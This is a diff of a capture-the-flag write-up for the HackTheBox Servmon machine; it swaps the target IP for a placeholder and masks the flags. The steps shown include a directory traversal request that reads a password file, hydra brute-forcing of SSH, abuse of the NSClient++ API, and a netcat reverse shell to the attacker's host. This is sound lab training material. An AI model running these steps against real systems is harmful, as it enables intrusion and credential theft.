@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Servmon
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-19_22-12-49.png)
-
 This was an easy Windows machine....but don't get stuck chasing the rabbits!
 
 ## Useful Skills and Tools
@@ -44,13 +42,13 @@ This was an easy Windows machine....but don't get stuck chasing the rabbits!
 
 ### Nmap scan
 
-First off, I started my enumeration with an nmap scan of `10.10.10.184`. The options I regularly use are: `-p-`, which is a shortcut that tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output to file with a name of `<name>`.
+First off, I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut that tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output to file with a name of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ nmap -p- -sC -sV -Pn -oN servmon.nmap 10.10.10.184
+zweilos@kalimaa:~/htb/servmon$ nmap -p- -sC -sV -Pn -oN servmon.nmap <YOUR_IP>
                            
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 22:24 EDT                                        
-Nmap scan report for 10.10.10.184                                                                      
+Nmap scan report for <YOUR_IP>                                                                      
 Host is up (0.047s latency).                                                                           
 Not shown: 65270 closed ports, 248 filtered ports                                                      
 PORT      STATE SERVICE       VERSION                                                                  
@@ -185,11 +183,11 @@ Lots of open ports on this machine.  There are a number of clues in this output 
 If port `21 - FTP` is open, that is usually a good place to start as logging in as `Anonymous` can be an easy way to find useful information. To do this enter `anonymous` when it prompts you for a name, then give an email address when it prompts for a password.  This does not have to be a real address, just in the format `a@b.c`.
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ ftp 10.10.10.184
+zweilos@kalimaa:~/htb/servmon$ ftp <YOUR_IP>
 
-Connected to 10.10.10.184.
+Connected to <YOUR_IP>.
 220 Microsoft FTP Service
-Name (10.10.10.184:zweilos): anonymous
+Name (<YOUR_IP>:zweilos): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
 230 User logged in.
@@ -267,7 +265,7 @@ The file `Confidential.txt` in `Nadine`'s folder gave me some more good news.  S
 
 ### HTTP - Port 80 🐇🐇
 
-Since I still didn't have a way in, the next place to enumerate was HTTP on port 80.  Navigating to `http://10.10.10.181` redirected to `http://10.10.10.184/Pages/login.htm` which had a page title of `NVMS-1000`.  This looks like the page with public access that `Nathan`'s to-do list had mentioned.  
+Since I still didn't have a way in, the next place to enumerate was HTTP on port 80.  Navigating to `http://<YOUR_IP>` redirected to `http://<YOUR_IP>/Pages/login.htm` which had a page title of `NVMS-1000`.  This looks like the page with public access that `Nathan`'s to-do list had mentioned.  
 
 ![NVMS-1000 Web Portal](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_17-14-29.png)
 
@@ -293,7 +291,7 @@ The machine was indeed vulnerable, and I used the information from the message `
 
 ```text
 GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
-Host: 10.10.10.184
+Host: <YOUR_IP>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -325,15 +323,15 @@ Gr4etN3w5w17hMySk1Pa5$
 Now that I had some credentials, it was time to try to log into the machine with them.  I decided to use the tool`hydra` to do a brute force attack against SSH for both users `Nathan` and `Nadine`.
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords 10.10.10.184 ssh
+zweilos@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords <YOUR_IP> ssh
 
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-20 21:06:59
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
-[DATA] attacking ssh://10.10.10.184:22/
-[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk
+[DATA] attacking ssh://<YOUR_IP>:22/
+[22][ssh] host: <YOUR_IP>   login: Nadine   password: L1k3B1gBut7s@W0rk
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-20 21:07:01
 ```
@@ -341,8 +339,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-20 21:07:
 Thank you `Nadine` for using one of the same passwords you recommended!
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ ssh Nadine@10.10.10.184
-Nadine@10.10.10.184's password: 
+zweilos@kalimaa:~/htb/servmon$ ssh Nadine@<YOUR_IP>
+Nadine@<YOUR_IP>'s password: 
 Microsoft Windows [Version 10.0.18363.752]
 (c) 2019 Microsoft Corporation. All rights reserved.
 
@@ -354,7 +352,6 @@ USER INFORMATION
 User Name      SID                                          
 ============== =============================================
 servmon\nadine S-1-5-21-3877449121-2587550681-992675040-1002
-
 
 GROUP INFORMATION
 -----------------
@@ -379,8 +376,6 @@ NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory g
 t, Enabled group
 Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
 
-
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -391,7 +386,6 @@ SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
 SeUndockPrivilege             Remove computer from docking station Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
 SeTimeZonePrivilege           Change the time zone                 Enabled
-
 
 nadine@SERVMON C:\Users\Nadine>
 ```
@@ -418,7 +412,7 @@ nadine@SERVMON C:\Users\Nadine\Desktop>dir
                2 Dir(s)  27,815,362,560 bytes free
 
 nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
-5ee172f5b05926cfc9eaf8c4eb8aad52
+****
 ```
 
 ### Metagaming - Other user's artifacts
@@ -456,7 +450,6 @@ nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
 # If you want to activate a module and bring in all its options use:
 #   nscp settings --activate-module <MODULE NAME> --add-defaults
 # For details run: nscp settings --help
-
 
 ; in flight - TODO
 [/settings/default]
@@ -584,7 +577,7 @@ Current password: ew2x6SsGTxjRwXOT
 
 Running the command in the exploit to get the NSCP web client administrator password gave me the same password that I had seen in the `nsclient.ini` file.  
 
-Looking back through my notes, I saw that there was a port I hadn't checked out yet from my early Nmap scan.  Port TCP 8443 showed a website with the information `http-title: NSClient++`.  Navigating to `http://10.10.10.184:8443` resulted in failure.  After doing a bit more looking around I found an entry in `nsclient.ini` that seemed to specify that the Web interface could only be accessed from the specified hosts, which only included 127.0.0.1 in this case.  _Later I noticed the port was also listed in nsclient.ini, oops._ 
+Looking back through my notes, I saw that there was a port I hadn't checked out yet from my early Nmap scan.  Port TCP 8443 showed a website with the information `http-title: NSClient++`.  Navigating to `http://<YOUR_IP>:8443` resulted in failure.  After doing a bit more looking around I found an entry in `nsclient.ini` that seemed to specify that the Web interface could only be accessed from the specified hosts, which only included 127.0.0.1 in this case.  _Later I noticed the port was also listed in nsclient.ini, oops._ 
 
 #### Using SSH to create a redirect tunnel \(Local Port Forwarding\)
 
@@ -592,7 +585,7 @@ In order to access this page through the web browser without some sort of remote
 
 {% embed url="https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/" %}
 
-`ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184`
+`ssh -L 8443:127.0.0.1:8443 Nadine@<YOUR_IP>`
 
 ### The web portal on port 8443
 
@@ -610,11 +603,9 @@ While reading through the API documentation at [https://docs.nsclient.org/api/sc
 Example¶
 Given a file called check_new.bat which contains the following:
 
-
 @echo OK: %1
 @exit 0
 We can use the following curl call to upload that as check_new.
-
 
 curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/check_new.bat --data-binary @check_new.bat
 Added check_new as scripts\check_new.bat
@@ -690,7 +681,7 @@ Despite the error message seen above, once I successfully uploaded `nc.exe` to t
 ```text
 zweilos@kalimaa:~$ nc -lvnp 12345
 listening on [any] 12345 ...
-connect to [10.10.15.20] from (UNKNOWN) [10.10.10.184] 49698
+connect to [10.10.15.20] from (UNKNOWN) [<YOUR_IP>] 49698
 Microsoft Windows [Version 10.0.18363.752]
 (c) 2019 Microsoft Corporation. All rights reserved.
 
@@ -704,7 +695,6 @@ User Name           SID
 =================== ========
 nt authority\system S-1-5-18
 
-
 GROUP INFORMATION
 -----------------
 
@@ -714,7 +704,6 @@ BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by 
 Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
 Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -770,9 +759,5 @@ _Oops. Apparently in a `cmd.exe` shell the direction of the slash is important w
 ```text
 C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
-3e42dab90f3ab8487973c7769382a639
+****
 ```
-
-Thanks to [dmw0ng](https://www.hackthebox.eu/home/users/profile/82600) for a fun and interesting challenge!  I certainly learned a few new useful tricks for dealing with Windows machines. 
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
